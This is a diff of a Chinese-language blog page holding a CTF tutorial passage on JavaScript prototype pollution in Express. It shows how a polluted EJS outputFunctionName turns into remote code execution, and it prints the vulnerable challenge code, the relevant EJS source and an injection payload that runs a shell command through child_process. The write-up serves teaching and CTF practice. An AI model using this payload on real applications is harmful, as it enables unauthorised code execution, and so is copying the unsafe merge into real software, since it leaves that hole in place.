+<h2 id="0x03-如何RCE"><a href="#0x03-如何RCE" class="headerlink" title="0x03 如何RCE"></a>0x03 如何RCE</h2><h3 id="找命令执行函数中的可控参数或危险漏洞"><a href="#找命令执行函数中的可控参数或危险漏洞" class="headerlink" title="找命令执行函数中的可控参数或危险漏洞"></a>找命令执行函数中的可控参数或危险漏洞</h3><p>CTF中node题用的库大部分都存在能和原型链配合打出rce的漏洞,发现题目需要getshell的时候就要关注下所有函数是否存在漏洞。</p>
+<p>例如</p>
+<p>设有如下代码(GYCTF2020 EZ_EXPRESS,buuoj上有)</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.Router();</span><br><span class="line"><span class="keyword">const</span> isObject = <span class="function"><span class="params">obj</span> =&gt;</span> obj &amp;&amp; obj.constructor &amp;&amp; obj.constructor === <span class="built_in">Object</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> merge = <span class="function">(<span class="params">a, b</span>) =&gt;</span> &#123;    <span class="comment">// 发现 merge 危险操作</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> attr <span class="keyword">in</span> b) &#123;</span><br><span class="line">    <span class="keyword">if</span> (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123;</span><br><span class="line">      merge(a[attr], b[attr]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      a[attr] = b[attr];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> clone = <span class="function">(<span class="params">a</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> merge(&#123;&#125;, a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safeKeyword</span>(<span class="params">keyword</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(keyword.match(<span class="regexp">/(admin)/i</span>s)) &#123;</span><br><span class="line">      <span class="keyword">return</span> keyword</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">undefined</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(!req.session.user)&#123;</span><br><span class="line">    res.redirect(<span class="string">&#x27;/login&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  res.outputFunctionName=<span class="literal">undefined</span>;</span><br><span class="line">  res.render(<span class="string">&#x27;index&#x27;</span>,data=&#123;<span class="string">&#x27;user&#x27;</span>:req.session.user.user&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/login&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.render(<span class="string">&#x27;login&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.post(<span class="string">&#x27;/login&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(req.body.Submit==<span class="string">&quot;register&quot;</span>)&#123;</span><br><span class="line">   <span class="keyword">if</span>(safeKeyword(req.body.userid))&#123;</span><br><span class="line">    res.end(<span class="string">&quot;&lt;script&gt;alert(&#x27;forbid word&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>) </span><br><span class="line">   &#125;</span><br><span class="line">    req.session.user=&#123;</span><br><span class="line">      <span class="string">&#x27;user&#x27;</span>:req.body.userid.toUpperCase(),    <span class="comment">// 变成大写</span></span><br><span class="line">      <span class="string">&#x27;passwd&#x27;</span>: req.body.pwd,</span><br><span class="line">      <span class="string">&#x27;isLogin&#x27;</span>:<span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">    res.redirect(<span class="string">&#x27;/&#x27;</span>); </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span>(req.body.Submit==<span class="string">&quot;login&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.session.user)&#123;res.end(<span class="string">&quot;&lt;script&gt;alert(&#x27;register first&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)&#125;</span><br><span class="line">    <span class="keyword">if</span>(req.session.user.user==req.body.userid&amp;&amp;req.body.pwd==req.session.user.passwd)&#123;</span><br><span class="line">      req.session.user.isLogin=<span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">      res.end(<span class="string">&quot;&lt;script&gt;alert(&#x27;error passwd&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  res.redirect(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line">router.post(<span class="string">&#x27;/action&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;    <span class="comment">// /action 路由只能 admin 用户访问</span></span><br><span class="line">  <span class="keyword">if</span>(req.session.user.user!=<span class="string">&quot;ADMIN&quot;</span>)&#123;res.end(<span class="string">&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)&#125; </span><br><span class="line">  req.session.user.data = clone(req.body);    <span class="comment">// 使用了之前定义的 merge 危险操作</span></span><br><span class="line">  res.end(<span class="string">&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>);  </span><br><span class="line">&#125;);</span><br><span class="line">router.get(<span class="string">&#x27;/info&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.render(<span class="string">&#x27;index&#x27;</span>,data=&#123;<span class="string">&#x27;user&#x27;</span>:res.outputFunctionName&#125;);</span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">module</span>.exports = router;</span><br><span class="line">源码中用了 merge() 和 clone()，那必定是原型链污染了。往下找到调用 clone() 的位置：</span><br><span class="line"></span><br><span class="line">router.post(<span class="string">&#x27;/action&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;    <span class="comment">// /action路由只能admin用户访问</span></span><br><span class="line">  <span class="keyword">if</span>(req.session.user.user!=<span class="string">&quot;ADMIN&quot;</span>)&#123;res.end(<span class="string">&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)&#125; </span><br><span class="line">  req.session.user.data = clone(req.body);    <span class="comment">// 使用了之前定义的危险的merge操作</span></span><br><span class="line">  res.end(<span class="string">&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>);  </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p>流程大概就是伪造成admin然后在/action下进行原型链污染<br>如何伪造admin看p师傅的这篇<a target="_blank" rel="noopener" href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html">文章</a></p>
+<p>在/info路径下存在一个问题</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">res.render(<span class="string">&#x27;index&#x27;</span>,data=&#123;<span class="string">&#x27;user&#x27;</span>:res.outputFunctionName&#125;);</span><br></pre></td></tr></table></figure>
+<p>这里渲染采用了ejs模板,这种模板渲染时若可控制原型的outputFunctionName,会存在一个命令注入</p>
+<p>具体可以调试跟踪渲染,会发现在调用compile成员函数时有个地方可以构造恶意代码</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">this</span>.source) &#123;</span><br><span class="line">      <span class="built_in">this</span>.generateSource();</span><br><span class="line">      prepended +=</span><br><span class="line">        <span class="string">&#x27;  var __output = &quot;&quot;;\n&#x27;</span> +</span><br><span class="line">        <span class="string">&#x27;  function __append(s) &#123; if (s !== undefined &amp;&amp; s !== null) __output += s &#125;\n&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">      <span class="keyword">if</span> (opts.outputFunctionName) &#123;</span><br><span class="line">        prepended += <span class="string">&#x27;  var &#x27;</span> + opts.outputFunctionName + <span class="string">&#x27; = __append;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>opts 对象 outputFunctionName 并没有给他赋值。在我们有原型链污染的前提之下，我们可以控制基类的成员。这样我们给 Object 类创建一个成员 outputFunctionName，这样可以进入 if 语句，并将我们控制的成员 outputFunctionName 赋值为一串恶意代码，从而造成代码注入。<br>如</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a; <span class="keyword">return</span> <span class="built_in">global</span>.process.mainModule.constructor._load(<span class="string">&#x27;child_process&#x27;</span>).execSync(<span class="string">&#x27;whoami&#x27;</span>); <span class="comment">//</span></span><br></pre></td></tr></table></figure>
+<p>此时代码就变成</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">prepended += <span class="string">&#x27; &#x27;</span><span class="keyword">var</span> a; <span class="keyword">return</span> <span class="built_in">global</span>.process.mainModule.constructor._load(<span class="string">&quot;child_process&quot;</span>).execSync(<span class="string">&quot;whoami&quot;</span>); </span><br><span class="line"><span class="comment">// 后面的代码都被注释了&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>所以上面那道题目就可以修改下命令就能直接打了</p>
+<p>具体大家可以调试跟进看看,这里推荐vscode,在vscode可以很方便的类似ide那样对node进行调试非常方便</p>
+<h2 id="0x04-拓展知识"><a href="#0x04-拓展知识" class="headerlink" title="0x04 拓展知识"></a>0x04 拓展知识</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/246492">pug污染</a></p>
+</blockquote>
+<blockquote>
+<p><em>HBS模板注入</em> <a target="_blank" rel="noopener" href="https://handlebarsjs.com/">官方文档</a>   <a href="discord.com/channels/872090796952809482/872090796952809485">实战</a></p>
+</blockquote>
+<h2 id="0x05-推荐几题"><a href="#0x05-推荐几题" class="headerlink" title="0x05 推荐几题"></a>0x05 推荐几题</h2><p>CTF中原型链污染主要流程就是先找危险/漏洞函数,函数有可能是编写者自己写的merge,且参数可控,或者是某个库已知的漏洞,需要分析好可能的触发点。可能还会有很多js的trick。需要一定的代码审计功底，这里推荐写已有分析的题目,大家可以跟着学</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html">Code-Breaking 2018 Thejs 分析</a></li>
+<li><a target="_blank" rel="noopener" href="https://aluvion.github.io/2019/04/11/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/#Handlebars%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%88%B0RCE">Express+lodash+ejs: 从原型链污染到RCE</a></li>
+<li><a target="_blank" rel="noopener" href="https://aluvion.github.io/2019/04/11/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/#CTF3">JavaScript原型链污染</a></li>
+</ul>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x04">深入理解 JavaScript Prototype 污染攻击</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.szfszf.top/tech/javascript-%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93-%e5%88%86%e6%9e%90/">Javascript 原型链污染 分析</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4229#toc-7">Node.js 原型污染攻击的分析与利用</a></p>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">javascript</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=https://corrupt7.github.io/2021/07/28/hbs%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
+  
+    <a href="/2021/07/28/%E6%96%87%E7%AB%A0%E6%8E%A8%E8%8D%90/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          文章推荐
+        
+      </div>
+    </a>
   
   
-    </div></section>
+    <a href="/2021/07/14/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">JavaScript原型链污染</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+  
+  
   
 
-    
+  
+
+  
+
+  
 
 
           </div>
@@ -203,8 +420,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
@@ -286,6 +503,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">文章推荐</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">javascript</a>
               </li>
             
             <div class="clearfix"></div>
